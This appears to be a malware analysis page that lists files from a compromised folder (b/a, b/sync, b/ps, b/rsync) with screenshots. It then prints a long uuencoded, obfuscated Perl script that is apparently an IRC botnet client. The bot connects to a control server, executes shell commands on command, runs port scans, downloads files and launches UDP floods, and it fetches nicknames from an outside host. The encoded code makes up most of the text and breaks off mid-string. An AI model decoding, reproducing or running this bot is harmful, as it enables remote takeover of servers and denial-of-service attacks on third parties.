資料夾\n\n![](https://i.imgur.com/zDc1NE8.png)\n\n\nb/a\n\n![](https://i.imgur.com/kqS6OOl.png)\n\n\nb/sync\n\n![](https://i.imgur.com/H6Hdy2a.png)\n\n\nb/ps\n\n二進位執行檔案\n\nb/rsync\n\n![](https://i.imgur.com/nQgpx0Z.png)\n\n```perl\neval unpack u=>q{_\"FUY(\"1P<F]C97-S;R`](\"=R<WEN8R<[\"@HD<V5R=FED;W(])S4N,C4U+C@V+C$R.2<@=6YL97-S(\"1S97)V_:61O<CL*;7D@)'!O<G1A/2<T-#,G.PIM>2!`8V%N86ES/2@B(S`P-R(I.PIM>2!`861M<STH(D$B+\")8(BD[_\"FUY($!A=71H/2@B;&]C86QH;W-T(BD[\"@IM>2`D;&EN87-?;6%X/38[\"FUY(\"1S;&5E<#TS.PH*;7D@)&YI_8VL@/2!G971N:6-K*\"D[\"FUY(\"1I<F-N86UE(#T@9V5T;FEC:R@I.PIM>2`D<F5A;&YA;64@/2`H8'5N86UE_(\"UA8\"D[\"@IM>2`D86-E<W-O<VAE;&P@/2`Q.PIM>2`D<')E9FEX;R`](\"(A(\"([\"FUY(\"1E<W1A=&ES=&EC_87,@/2`P.PIM>2`D<&%C;W1E<R`](#$[\"@IM>2`D5D524T%/(#T@)S`N,F$G.PH*)%-)1WLG24Y4)WT@/2`G_24=.3U)%)SL*)%-)1WLG2%50)WT@/2`G24=.3U)%)SL*)%-)1WLG5$5232=](#T@)TE'3D]212<[\"B1324=[_)T-(3$0G?2`](\"=)1TY/4D4G.PHD4TE'>R=04R=](#T@)TE'3D]212<[\"@IU<V4@24\\Z.E-O8VME=#L*=7-E_(%-O8VME=#L*=7-E($E/.CI396QE8W0[\"F-H9&ER*\"(O(BD[\"B1S97)V:61O<CTB)$%21U9;,%TB(&EF(\"1!_4D=66S!=.PHD,#TB)'!R;V-E<W-O(BXB7#`B.PIM>2`D<&ED/69O<FL[\"F5X:70@:68@)'!I9#L*9&EE(\")0_<F]B;&5M82!C;VT@;R!F;W)K.B`D(2(@=6YL97-S(&1E9FEN960H)'!I9\"D[\"@IM>2`E:7)C7W-E<G9E<G,[_\"FUY(\"5$0T,[\"FUY(\"1D8V-?<V5L(#T@;F5W($E/.CI396QE8W0M/FYE=R@I.PH*\"@H*<W5B(&=E=&YI8VL@_>PH@(')E='5R;B`B>\"(N:6YT*')A;F0H.3`P,\"DI.PI]\"@H*<W5B(&=E=&ED96YT('L*(\"!M>2`D<F5T;W)N_;VED96YT(#T@)E]G970H(FAT='`Z+R]W=W<N;6EN<&]P+F-O;2]S:S$R<&%C:R]I9&5N=',N<&AP(BD[\"B`@_;7D@)&ED96YT8VAA;F-E(#T@:6YT*')A;F0H,3`P,\"DI.PH@(&EF(\"@D:61E;G1C:&%N8V4@/B`S,\"D@>PH@_(\"`@(')E='5R;B`D;FEC:SL*(\"!](&5L<V4@>PH@(\"`@(')E='5R;B`D<F5T;W)N;VED96YT.PH@('T*(\"!R_971U<FX@)')E=&]R;F]I9&5N=#L*?0H*<W5B(&=E=&YA;64@>PH@(&UY(\"1R971O<FYO;F%M92`](\"9?9V5T_*\")H='1P.B\\O=W=W+FUI;G!O<\"YC;VTO<VLQ,G!A8VLO;F%M97,N<&AP(BD[\"B`@<F5T=7)N(\"1R971O<FYO_;F%M93L*?0H*<W5B(&=E=&ED96YT,B![\"B`@(\"`@(\"`@;7D@)&QE;F=T:#US:&EF=#L*(\"`@(\"`@(\"`D;&5N_9W1H(#T@,R!I9B`H)&QE;F=T:\"`\\(#,I.PH*(\"`@(\"`@(\"!M>2!`8VAA<G,]*\"=A)RXN)WHG+\"=!)RXN)UHG_+\"<Q)RXN)SDG*3L*(\"`@(\"`@(\"!F;W)E86-H(\"@Q+BXD;&5N9W1H*0H@(\"`@(\"`@('L*(\"`@(\"`@(\"`@(\"`@_(\"`@(\"1R86YD;VUS=')I;F<N/21C:&%R<UMR86YD($!C:&%R<UT[\"B`@(\"`@(\"`@?0H@(\"`@(\"`@(')E='5R_;B`D<F%N9&]M<W1R:6YG.PI]\"@IS=6(@9V5T<W1O<F4@*\"0D*0I[\"B`@;7D@)'5R;\"`]('-H:69T.PH@(&UY_(\"1F:6QE(#T@<VAI9G0[\"@H@(\"1H='1P7W-T<F5A;5]O=70@/2`Q.PH@(&]P96XH1T547T]55$9)3$4L(\"(^_(\"1F:6QE(BD[\"B`@)6AT='!?;&]O<%]C:&5C:R`](\"@I.PH@(%]G970H)'5R;\"D[\"B`@8VQO<V4@1T547T]5_5$9)3$4[\"B`@<F5T=7)N(\"1M86EN.CIH='1P7V=E=%]R97-U;'0[\"GT*\"G-U8B!?9V5T\"GL*(\"!M>2`D=7)L_(#T@<VAI9G0[\"B`@;7D@)'!R;WAY(#T@(B([\"B`@9W)E<\"![*&QC*\"1?*2!E<2`B:'1T<%]P<F]X>2(I(\"8F_(\"@D<')O>'D@/2`D14Y6>R1??2E](&ME>7,@)45.5CL*(\"!I9B`H*\"1P<F]X>2!E<2`B(BD@)B8@)'5R;\"`]_?B!M+%YH='1P.B\\O*%M>+SI=*RDH/SHZ*%QD*RDI/R@O7%,J*3\\D+\"D@>PH@(\"`@;7D@)&AO<W0@/2`D,3L*_(\"`@(&UY(\"1P;W)T(#T@)#(@?'P@.#`[\"B`@(\"!M>2`D<&%T:\"`](\"0S.PH@(\"`@)'!A=&@@/2`B+R(@=6YL_97-S(&1E9FEN960H)'!A=&@I.PH@(\"`@<F5T=7)N(%]T<FEV:6%L7VAT='!?9V5T*\"1H;W-T+\"`D<&]R=\"P@_)'!A=&@I.PH@('T@96QS:68@*\"1P<F]X>2`]?B!M+%YH='1P.B\\O*%M>+SI=*RDZ*%QD*RDH+UQ3*BD_)\"PI_('L*(\"`@(&UY(\"1H;W-T(#T@)#$[\"B`@(\"!M>2`D<&]R=\"`](\"0R.PH@(\"`@;7D@)'!A=&@@/2`D=7)L.PH@_(\"`@<F5T=7)N(%]T<FEV:6%L7VAT='!?9V5T*\"1H;W-T+\"`D<&]R=\"P@)'!A=&@I.PH@('T@96QS92![\"B`@_(\"!R971U<FX@=6YD968[\"B`@?0I]\"@H*<W5B(%]T<FEV:6%L7VAT='!?9V5T\"GL*(\"!M>2@D:&]S=\"P@)'!O_<G0L(\"1P871H*2`]($!?.PH@(&UY*\"1!1T5.5\"P@)%9%4E-)3TXL(\"1P*3L*\"B`@)$%'14Y4(#T@(F=E=\"UM_:6YI;6%L(CL*(\"`D5D524TE/3B`](\"(R,#`P,#$Q.\"([\"@H@(\"1P871H(#U^(',O(\"\\E,C`O9SL*\"B`@<F5Q_=6ER92!)3SHZ4V]C:V5T.PH@(&QO8V%L*\"1>5RD@/2`P.PH@(&UY(\"1S;V-K(#T@24\\Z.E-O8VME=#HZ24Y%_5\"T^;F5W*%!E97)!9&1R(#T^(\"1H;W-T+`H@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(%!E_97)0;W)T(#T^(\"1P;W)T+`H@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(%!R;W1O(\"`@/3X@_)W1C<\"<L\"B`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@5&EM96]U=\"`@/3X@-C`I('Q\\(')E_='5R;CL*(\"`D<V]C:RT^875T;V9L=7-H.PH@(&UY(\"1N971L;V,@/2`D:&]S=#L*(\"`D;F5T;&]C(\"X](\"(Z_)'!O<G0B(&EF(\"1P;W)T(\"$](#@P.PH@(&UY(\"1R97%U97-T(#T@(D=%5\"`D<&%T:\"!(5%10+S$N,%PP,35<_,#$R(@H@(\"`@(\"`@(\"`@(\"`@(\"X@(DAO<W0Z(\"1N971L;V-<,#$U7#`Q,B(*(\"`@(\"`@(\"`@(\"`@(\"`N(\")5_<V5R+4%G96YT.B`D04=%3E0O)%9%4E-)3TXO=5PP,35<,#$R(CL*(\"`D<F5Q=65S=\"`N/2`B4')A9VUA.B!N_;RUC86-H95PP,35<,#$R(B!I9B`H)&UA:6XZ.FAT='!?;F]?8V%C:&4I.PH@(\"1R97%U97-T(\"X](\")<,#$U_7#`Q,B([\"B`@<')I;G0@)'-O8VL@)')E<75E<W0[\"@H@(&UY(\"1B=68@/2`B(CL*(\"!M>2`D;CL*(\"!M>2`D_8C$@/2`B(CL*(\"!W:&EL92`H)&X@/2!S>7-R96%D*\"1S;V-K+\"`D8G5F+\"`X*C$P,C0L(&QE;F=T:\"@D8G5F_*2DI('L*(\"`@(&EF(\"@D8C$@97$@(B(I('L@\"B`@(\"`@(\"1B,2`](\"1B=68[(\"`@(\"`@(\"`@\"B`@(\"`@(\"1B_=68@/7X@<R\\N*S]<,#$U/UPP,3)<,#$U/UPP,3(O+W,[(\"`@(\"`@\"B`@(\"!]\"B`@(\"!I9B`H)&AT='!?<W1R_96%M7V]U=\"D@>R!P<FEN=\"!'151?3U541DE,12`D8G5F.R`D8G5F(#T@(B([('T*(\"!]\"B`@<F5T=7)N('5N_9&5F('5N;&5S<R!D969I;F5D*\"1N*3L*\"B`@)&UA:6XZ.FAT='!?9V5T7W)E<W5L=\"`](#(P,#L*(\"!I9B`H_)&(Q(#U^(&TL7DA45%`O7&0K7\"Y<9\"M<<RLH7&0K*5M>7#`Q,ETJ7#`Q,BPI('L*(\"`@(\"1M86EN.CIH='1P_7V=E=%]R97-U;'0@/2`D,3L*(\"`@(&EF(\"@D;6%I;CHZ:'1T<%]G971?<F5S=6QT(#U^(\"]>,S!;,3(S-UTO_(\"8F(\"1B,2`]?B`O7#`Q,DQO8V%T:6]N.EQS*BA<4RLI+PHI('L*(\"`@(\"`@;7D@)'5R;\"`](\"0Q.PH@(\"`@_(\"!R971U<FX@=6YD968@:68@)&AT='!?;&]O<%]C:&5C:WLD=7)L?2LK.PH@(\"`@(\"!R971U<FX@7V=E=\"@D_=7)L*3L*(\"`@('T*(\"`@(')E='5R;B!U;F1E9B!U;FQE<W,@)&UA:6XZ.FAT='!?9V5T7W)E<W5L=\"`]?B`O_7C(O.PH@('T*\"B`@<F5T=7)N(\"1B=68[\"GT*\"@HD<V5L7V-L:65N=&4@/2!)3SHZ4V5L96-T+3YN97<H*3L*_<W5B('-E;F1R87<@>PH@(&EF(\"@D(U\\@/3T@)S$G*2![\"B`@(\"!M>2`D<V]C:V5T(#T@)%];,%T[\"B`@(\"!P_<FEN=\"`D<V]C:V5T(\"(D7ULQ75QN(CL*(\"!](&5L<V4@>PH@(\"`@(\"!P<FEN=\"`D25)#7V-U<E]S;V-K970@_(B1?6S!=7&XB.PH@('T*?0H*<W5B(&-O;F5C=&%R('L*(\"`@;7D@)&UE=6YI8VL@/2`D7ULP73L*(\"`@;7D@_)'-E<G9I9&]R7V-O;B`](\"1?6S%=.PH@(\"!M>2`D<&]R=&%?8V]N(#T@)%];,ET[\"@H@(\"!M>2`D25)#7W-O_8VME=\"`]($E/.CI3;V-K970Z.DE.150M/FYE=RA0<F]T;ST^(G1C<\"(L(%!E97)!9&1R/3XB)'-E<G9I9&]R_7V-O;B(L(%!E97)0;W)T/3XD<&]R=&%?8V]N*2!O<B!R971U<FXH,2D[\"B`@(&EF(\"AD969I;F5D*\"1)4D-?_<V]C:V5T*2D@>PH@(\"`@(\"1)4D-?8W5R7W-O8VME=\"`](\"1)4D-?<V]C:V5T.PH*(\"`@(\"`D25)#7W-O8VME_=\"T^875T;V9L=7-H*#$I.PH@(\"`@(\"1S96Q?8VQI96YT92T^861D*\"1)4D-?<V]C:V5T*3L*\"B`@(\"`@)&ER_8U]S97)V97)S>R1)4D-?8W5R7W-O8VME='U[)VAO<W0G?2`](\"(D<V5R=FED;W)?8V]N(CL*(\"`@(\"`D:7)C_7W-E<G9E<G-[)$E20U]C=7)?<V]C:V5T?7LG<&]R=&$G?2`](\"(D<&]R=&%?8V]N(CL*(\"`@(\"`D:7)C7W-E_<G9E<G-[)$E20U]C=7)?<V]C:V5T?7LG;FEC:R=](#T@)&UE=6YI8VL[\"B`@(\"`@)&ER8U]S97)V97)S>R1)_4D-?8W5R7W-O8VME='U[)VUE=6EP)WT@/2`D25)#7W-O8VME=\"T^<V]C:VAO<W0[\"B`@(\"`@;FEC:R@B)&UE_=6YI8VLB*3L*(\"`@(\"!S96YD<F%W*\")54T52(\"1I<F-N86UE(\"(N)$E20U]S;V-K970M/G-O8VMH;W-T+B(@_)'-E<G9I9&]R7V-O;B`Z)')E86QN86UE(BD[\"B`@(\"`@<VQE97`@,CL*(\"`@?0H*?0IM>2`D;&EN95]T96UP_.PIW:&EL92@@,2`I('L*(\"`@=VAI;&4@*\"$H:V5Y<R@E:7)C7W-E<G9E<G,I*2D@>R!C;VYE8W1A<B@B)&YI_8VLB+\"`B)'-E<G9I9&]R(BP@(B1P;W)T82(I.R!]\"B`@(&1E;&5T92@D:7)C7W-E<G9E<G-[)R=]*2!I9B`H_9&5F:6YE9\"@D:7)C7W-E<G9E<G-[)R=]*2D[\"B`@(\"9$0T,Z.F-O;FYE8W1I;VYS.PH@(\"!M>2!`<F5A9'D@_/2`D<V5L7V-L:65N=&4M/F-A;E]R96%D*#`N-BD[\"B`@(&YE>'0@=6YL97-S*$!R96%D>2D[\"B`@(&9O<F5A_8V@@)&9H(\"A`<F5A9'DI('L*(\"`@(\"`D25)#7V-U<E]S;V-K970@/2`D9F@[\"B`@(\"`@)&UE=6YI8VL@/2`D_:7)C7W-E<G9E<G-[)$E20U]C=7)?<V]C:V5T?7LG;FEC:R=].PH@(\"`@(\"1N<F5A9\"`]('-Y<W)E860H)&9H_+\"`D;7-G+\"`T,#DV*3L*(\"`@(\"!I9B`H)&YR96%D(#T](#`I('L*(\"`@(\"`@(\"`D<V5L7V-L:65N=&4M/G)E_;6]V92@D9F@I.PH@(\"`@(\"`@(\"1F:\"T^8VQO<V4[\"B`@(\"`@(\"`@9&5L971E*\"1I<F-?<V5R=F5R<WLD9FA]_*3L*(\"`@(\"!]\"B`@(\"`@0&QI;F5S(#T@<W!L:70@*\"]<;B\\L(\"1M<V<I.PH*(\"`@(\"!F;W(H;7D@)&,],#L@_)&,\\/2`D(VQI;F5S.R`D8RLK*2![\"B`@(\"`@(\"`D;&EN92`](\"1L:6YE<ULD8UT[\"B`@(\"`@(\"`D;&EN93TD_;&EN95]T96UP+B1L:6YE(&EF(\"@D;&EN95]T96UP*3L*(\"`@(\"`@(\"1L:6YE7W1E;7`])R<[\"B`@(\"`@(\"`D_;&EN92`]?B!S+UQR)\"\\O.PH@(\"`@(\"`@=6YL97-S(\"@D8R`]/2`D(VQI;F5S*2![\"B`@(\"`@(\"`@('!A<G-E_*\"(D;&EN92(I.PH@(\"`@(\"`@?2!E;'-E('L*(\"`@(\"`@(\"`@(\"!I9B`H)\"-L:6YE<R`]/2`P*2![\"B`@(\"`@_(\"`@(\"`@(\"!P87)S92@B)&QI;F4B*3L*(\"`@(\"`@(\"`@(\"!](&5L<VEF(\"@D;&EN97-;)&-=(#U^(\"]<<B0O_*2![\"B`@(\"`@(\"`@(\"`@(\"`@('!A<G-E*\"(D;&EN92(I.PH@(\"`@(\"`@(\"`@('T@96QS:68@*\"1L:6YE(#U^_(\"]>*%Q3*RD@3D]424-%($%55$@@.EPJ7\"I<*B\\I('L*(\"`@(\"`@(\"`@(\"`@(\"`@<&%R<V4H(B1L:6YE(BD[_\"B`@(\"`@(\"`@(\"`@?2!E;'-E('L*(\"`@(\"`@(\"`@(\"`@(\"`@)&QI;F5?=&5M<\"`](\"1L:6YE.PH@(\"`@(\"`@_(\"`@('T*(\"`@(\"`@('T*(\"`@(\"`@?0H@(\"!]\"GT*\"G-U8B!P87)S92![\"B`@(&UY(\"1S97)V87)G(#T@<VAI_9G0[\"B`@(&EF(\"@D<V5R=F%R9R`]?B`O7E!)3D<@7#HH+BHI+RD@>PH@(\"`@('-E;F1R87<H(E!/3D<@.B0Q_(BD[\"B`@('T@96QS:68@*\"1S97)V87)G(#U^(\"]>7#HH+BL_*5PA*\"XK/RE<0\"@N*S\\I(%!2259-4T<@*\"XK_/RD@7#HH+BLI+RD@>PH@(\"`@(\"`@;7D@)'!N/20Q.R!M>2`D;VYD92`](\"0T.R!M>2`D87)G<R`](\"0U.PH@_(\"`@(\"`@:68@*\"1A<F=S(#U^(\"]>7#`P,59%4E-)3TY<,#`Q)\"\\I('L*(\"`@(\"`@(\"`@;F]T:6-E*\"(D<&XB_+\"`B7#`P,59%4E-)3TX@;4E20R!V-BXQ-B!%3D4@04Q)3B!'04)2245,7#`P,2(I.PH@(\"`@(\"`@?0H@(\"`@_(\"`@96QS:68@*\"1A<F=S(#U^(\"]>7#`P,5!)3D=<<RLH7&0K*5PP,#$D+RD@>PH@(\"`@(\"`@(\"!N;W1I8V4H_(B1P;B(L(\")<,#`Q4$].1UPP,#$B*3L*(\"`@(\"`@('T*(\"`@(\"`@(&5L<VEF(\"AG<F5P('LD7R`]?B`O7EQ1_)'!N7$4D+VD@?2!`861M<RD@>PH@(\"`@(\"`@(\"!I9B`H)&]N9&4@97$@(B1M975N:6-K(BE[\"B`@(\"`@(\"`@_(\"`@<VAE;&PH(B1P;B(L(\"(D87)G<R(I.PH@(\"`@(\"`@(\"`@('T*(\"`@(\"`@(\"`@96QS:68@*\"1A<F=S(#U^_(\"]>*%Q1)&UE=6YI8VM<17Q<421P<F5F:7AO7$4I7',K*\"XJ*2\\@*2![\"B`@(\"`@(\"`@(\"`@(&UY(\"1N871R_:7@@/2`D,3L*(\"`@(\"`@(\"`@(\"`@;7D@)&%R9R`](\"0R.PH@(\"`@(\"`@(\"`@(\"!I9B`H)&%R9R`]?B`O7EPA_*\"XJ*2\\I('L*(\"`@(\"`@(\"`@(\"`@(\"!I<F-A<V4H(B1P;B(L(B1O;F1E(BPB)#$B*2!U;FQE<W,@*\"1N871R_:7@@97$@(B1P<F5F:7AO(B!A;F0@)&%R9R`]?B`O7EPA;FEC:R\\I.PH@(\"`@(\"`@(\"`@(\"!](&5L<VEF(\"@D_87)G(#U^(\"]>7$`H+BHI+RD@>PH@(\"`@(\"`@(\"`@(\"`@(\"`@)&]N9&5P(#T@)&]N9&4[\"B`@(\"`@(\"`@(\"`@_(\"`@(\"`D;VYD97`@/2`D<&X@:68@)&]N9&4@97$@)&UE=6YI8VL[\"B`@(\"`@(\"`@(\"`@(\"`@(\"!B9G5N8R@B_)&]N9&5P(BPB)#$B*3L*(\"`@(\"`@(\"`@(\"`@?2!E;'-E('L*(\"`@(\"`@(\"`@(\"`@(\"`@('-H96QL*\"(D;VYD_92(L(\"(D87)G(BD[\"B`@(\"`@(\"`@(\"`@('T*(\"`@(\"`@(\"`@?0H@(\"`@(\"`@?0H@(\"!](&5L<VEF(\"@D<V5R_=F%R9R`]?B`O7EPZ*\"XK/RE<(2@N*S\\I7$`H+BL_*5QS*TY)0TM<<RM<.BA<4RLI+VDI('L*(\"`@(\"`@(&EF_(\"AL8R@D,2D@97$@;&,H)&UE=6YI8VLI*2![\"B`@(\"`@(\"`@(\"1M975N:6-K/20T.PH@(\"`@(\"`@(\"`D:7)C_7W-E<G9E<G-[)$E20U]C=7)?<V]C:V5T?7LG;FEC:R=](#T@)&UE=6YI8VL[\"B`@(\"`@(\"!]\"B`@('T@96QS_:68@*\"1S97)V87)G(#U^(&TO7EPZ*\"XK/RE<<RLT,S,O:2D@>PH@(\"`@(\"`@)&UE=6YI8VL@/2!G971N:6-K_*\"D[\"B`@(\"`@(\"!N:6-K*\"(D;65U;FEC:R(I.PH@(\"!](&5L<VEF(\"@D<V5R=F%R9R`]?B!M+UY<.B@N*S\\I_7',K,#`Q7',K*%Q3*RE<<R]I*2![\"B`@(\"`@(\"`D;65U;FEC:R`](\"0R.PH@(\"`@(\"`@)&ER8U]S97)V97)S_>R1)4D-?8W5R7W-O8VME='U[)VYI8VLG?2`](\"1M975N:6-K.PH@(\"`@(\"`@)&ER8U]S97)V97)S>R1)4D-?_8W5R7W-O8VME='U[)VYO;64G?2`](\"(D,2([\"B`@(\"`@(\"!F;W)E86-H(&UY(\"1C86YA;\"`H0&-A;F%I<RD@_>PH@(\"`@(\"`@(\"!S96YD<F%W*\")*3TE.(\"1C86YA;\"(I.PH@(\"`@(\"`@?0H@(\"!]\"GT*\"G-U8B!B9G5N8R![_\"B`@;7D@)'!R:6YT;\"`](\"1?6S!=.PH@(&UY(\"1F=6YC87)G(#T@)%];,5T[\"B`@:68@*&UY(\"1P:60@/2!F_;W)K*2![\"B`@(\"`@=V%I='!I9\"@D<&ED+\"`P*3L*(\"!](&5L<V4@>PH@(\"`@(\"!I9B`H9F]R:RD@>PH@(\"`@_(\"`@(\"!E>&ET.PH@(\"`@(\"`@?2!E;'-E('L*(\"`@(\"`@(\"`@(\"!I9B`H)&9U;F-A<F<@/7X@+UYP;W)T<V-A_;B`H+BHI+RD@>PH@(\"`@(\"`@(\"`@(\"`@;7D@)&AO<W1I<#TB)#$B.PH@(\"`@(\"`@(\"`@(\"`@;7D@0'!O<G1A_<STH(C(Q(BPB,C(B+\"(R,R(L(C(U(BPB-3,B+\"(X,\"(L(C$Q,\"(L(C$T,R(L(C8V-C4B*3L*(\"`@(\"`@(\"`@_(\"`@(&UY(\"A`86)E<G1A+\"`E<&]R=&%?8F%N;F5R*3L*(\"`@(\"`@(\"`@(\"`@(&9O<F5A8V@@;7D@)'!O<G1A_(\"A`<&]R=&%S*2`@>PH@(\"`@(\"`@(\"`@(\"`@(\"`@;7D@)'-C86YS;V-K(#T@24\\Z.E-O8VME=#HZ24Y%5\"T^_;F5W*%!E97)!9&1R(#T^(\"1H;W-T:7`L(%!E97)0;W)T(#T^(\"1P;W)T82P@4')O=&\\@/3X@)W1C<\"<L(%1I_;65O=70@/3X@-\"D[\"B`@(\"`@(\"`@(\"`@(\"`@(\"!I9B`H)'-C86YS;V-K*2![\"B`@(\"`@(\"`@(\"`@(\"`@(\"`@_(\"!P=7-H(\"A`86)E<G1A+\"`D<&]R=&$I.PH@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@)'-C86YS;V-K+3YC;&]S93L*_(\"`@(\"`@(\"`@(\"`@(\"`@('T*(\"`@(\"`@(\"`@(\"`@('T*(\"`@(\"`@(\"`@(\"`@(&EF(\"A`86)E<G1A*2![\"B`@_(\"`@(\"`@(\"`@(\"`@('-E;F1R87<H)$E20U]C=7)?<V]C:V5T+\"`B4%))5DU31R`D<')I;G1L(#I0;W)T87,@_86)E<G1A<SH@0&%B97)T82(I.PH@(\"`@(\"`@(\"`@(\"`@?2!E;'-E('L*(\"`@(\"`@(\"`@(\"`@(\"`@(\"!S96YD_<F%W*\"1)4D-?8W5R7W-O8VME=\"PB4%))5DU31R`D<')I;G1L(#I.96YH=6UA('!O<G1A(&%B97)T82!F;VD@_96YC;VYT<F%D82XB*3L*(\"`@(\"`@(\"`@(\"`@('T*(\"`@(\"`@(\"`@(\"!]\"@H@(\"`@(\"`@(\"`@(&5L<VEF(\"@D_9G5N8V%R9R`]?B`O7F1O=VYL;V%D7',K*\"XJ*5QS*R@N*BDO*2![\"B`@(\"`@(\"`@(\"`@(&=E='-T;W)E*\"(D_,2(L(\"(D,B(I.PH@(\"`@(\"`@(\"`@(\"!S96YD<F%W*\"1)4D-?8W5R7W-O8VME=\"P@(E!2259-4T<@)'!R:6YT_;\"`Z1&]W;FQO860@9&4@)#(@*\"0Q*2!#;VYC;'4N9&\\A(BD@:68@*\"1E<W1A=&ES=&EC87,I.PH@(\"`@(\"`@_(\"`@(\"!]\"@H@(\"`@(\"`@(\"`@(&5L<VEF(\"@D9G5N8V%R9R`]?B`O7F9U;&QP;W)T<V-A;EQS*R@N*BE<<RLH_7&0K*5QS*RA<9\"LI+RD@>PH@(\"`@(\"`@(\"`@(\"`@;7D@)&AO<W1N86UE/2(D,2([\"B`@(\"`@(\"`@(\"`@(\"!M_>2`D<&]R=&%I;FEC:6%L(#T@(B0R(CL*(\"`@(\"`@(\"`@(\"`@(&UY(\"1P;W)T869I;F%L(#T@(B0S(CL*(\"`@_(\"`@(\"`@(\"`@(&UY(\"A`86)E<G1A<RP@)7!O<G1A7V)A;FYE<BD[\"B`@(\"`@(\"`@(\"`@(\"!F;W)E86-H(&UY_(\"1P;W)T82`H)'!O<G1A:6YI8VEA;\"XN)'!O<G1A9FEN86PI\"B`@(\"`@(\"`@(\"`@(\"![\"B`@(\"`@(\"`@(\"`@_(\"`@(&UY(\"1S8V%N<V]C:R`]($E/.CI3;V-K970Z.DE.150M/FYE=RA0965R061D<B`]/B`D:&]S=&YA;64L_(%!E97)0;W)T(#T^(\"1P;W)T82P@4')O=&\\@/3X@)W1C<\"<L(%1I;65O=70@/3X@-\"D[\"B`@(\"`@(\"`@(\"`@_(\"`@(&EF(\"@D<V-A;G-O8VLI('L*(\"`@(\"`@(\"`@(\"`@(\"`@(\"!P=7-H(\"A`86)E<G1A<RP@)'!O<G1A*3L*_(\"`@(\"`@(\"`@(\"`@(\"`@(\"`D<V-A;G-O8VLM/F-L;W-E.PH@(\"`@(\"`@(\"`@(\"`@(\"`@(&EF(\"@D97-T871I_<W1I8V%S*2![\"B`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"!S96YD<F%W*\"1)4D-?8W5R7W-O8VME=\"P@(E!2259-4T<@_)'!R:6YT;\"`Z4&]R=&$@)'!O<G1A(&%B97)T82!E;2`D:&]S=&YA;64B*3L*(\"`@(\"`@(\"`@(\"`@(\"`@(\"!]_\"B`@(\"`@(\"`@(\"`@(\"`@('T*(\"`@(\"`@(\"`@(\"`@('T*(\"`@(\"`@(\"`@(\"`@(&EF(\"A`86)E<G1A<RD@>PH@_(\"`@(\"`@(\"`@(\"`@(\"!S96YD<F%W*\"1)4D-?8W5R7W-O8VME=\"P@(E!2259-4T<@)'!R:6YT;\"`Z4&]R=&%S_(&%B97)T87,Z($!A8F5R=&%S(BD[\"B`@(\"`@(\"`@(\"`@(\"!](&5L<V4@>PH@(\"`@(\"`@(\"`@(\"`@(\"!S96YD_<F%W*\"1)4D-?8W5R7W-O8VME=\"PB4%))5DU31R`D<')I;G1L(#I.96YH=6UA('!O<G1A(&%B97)T82!F;VD@_96YC;VYT<F%D82XB*3L*(\"`@(\"`@(\"`@(\"`@('T*(\"`@(\"`@(\"`@(\"`@?0H*(\"`@(\"`@(\"`@(\"`@96QS:68@_*\"1F=6YC87)G(#U^(\"]>=61P7',K*\"XJ*5QS*RA<9\"LI7',K*%QD*RDO*2![\"B`@(\"`@(\"`@(\"`@(\"`@<F5T_=7)N('5N;&5S<R`D<&%C;W1E<SL*(\"`@(\"`@(\"`@(\"`@(\"!S;V-K970H5'(P>\"P@4$9?24Y%5\"P@4T]#2U]$_1U)!32P@,3<I.PH@(\"`@(\"`@(\"`@(\"`@(&UY(\"1A;'9O/6EN971?871O;B@B)#$B*3L*(\"`@(\"`@(\"`@(\"`@_(\"!M>2`D<&]R=&$@/2`B)#(B.PH@(\"`@(\"`@(\"`@(\"`@(&UY(\"1T96UP;R`](\"(D,R([\"B`@(\"`@(\"`@(\"`@_(\"`@;7D@)'!A8V]T93L*(\"`@(\"`@(\"`@(\"`@(\"!M>2`D<&%C;W1E<V4[\"B`@(\"`@(\"`@(\"`@(\"`@;7D@)&9I_;2`]('1I;64@*R`D=&5M<&\\[\"B`@(\"`@(\"`@(\"`@(\"`@;7D@)'!A8V]T82`](#$[\"B`@(\"`@(\"`@(\"`@(\"`@_=VAI;&4@*\"@D<&%C;W1A(#T](\"(Q(BD@)B8@*\"1P86-O=&5S(#T](\"(Q(BDI('L*(\"`@(\"`@(\"`@(\"`@(\"`@_(\"1P86-O=&$@/2`P(&EF(\"@H=&EM92`^/2`D9FEM*2`F)B`H)'1E;7!O(\"$](\"(P(BDI.PH@(\"`@(\"`@(\"`@_(\"`@(\"`@)'!A8V]T93TD<F%N9\"!X(\"1R86YD('@@)')A;F0[\"B`@(\"`@(\"`@(\"`@(\"`@(\"`D<&]R=&$@/2!I_;G0H<F%N9\"`V-3`P,\"D@*S$@:68@*\"1P;W)T82`]/2`B,\"(I.PH@(\"`@(\"`@(\"`@(\"`@(\"`@<V5N9\"A4<C!X_+\"`P+\"`D<&%C;W1E+\"!S;V-K861D<E]I;B@D<&]R=&$L(\"1A;'9O*2D@86YD(\"1P86-O=&5S92LK(&EF(\"@D_<&%C;W1E<R`]/2`B,2(I.PH@(\"`@(\"`@(\"`@(\"`@('T*(\"`@(\"`@(\"`@(\"`@(\"!I9B`H)&5S=&%T:7-T:6-A_<RD*(\"`@(\"`@(\"`@(\"`@(\"![\"B`@(\"`@(\"`@(\"`@(\"`@('-E;F1R87<H)$E20U]C=7)?<V]C:V5T+\"`B4%))_5DU31R`D<')I;G1L(#I<,#`R5&5M<&\\@9&4@4&%C;W1E<UPP,#(Z(\"1T96UP;R(N(G,B*3L*(\"`@(\"`@(\"`@_(\"`@(\"`@<V5N9')A=R@D25)#7V-U<E]S;V-K970L(\")04DE635-'(\"1P<FEN=&P@.EPP,#)4;W1A;\"!D92!0_86-O=&5S7#`P,CH@)'!A8V]T97-E(BD[\"B`@(\"`@(\"`@(\"`@(\"`@('-E;F1R87<H)$E20U]C=7)?<V]C:V5T_+\"`B4%))5DU31R`D<')I;G1L(#I<,#`R06QV;R!D;W,@4&%C;W1E<UPP,#(Z(\"0Q(BD[\"B`@(\"`@(\"`@(\"`@_(\"`@?0H@(\"`@(\"`@(\"`@(\"!]\"@H@(\"`@(\"`@(\"`@(\"!E;'-I9B`H)&9U;F-A<F<@/7X@+UYU9'!F86EX85QS_*R@N*BE<<RLH7&0K*5QS*RA<9\"LI+RD@>PH@(\"`@(\"`@(\"`@(\"`@(')E='5R;B!U;F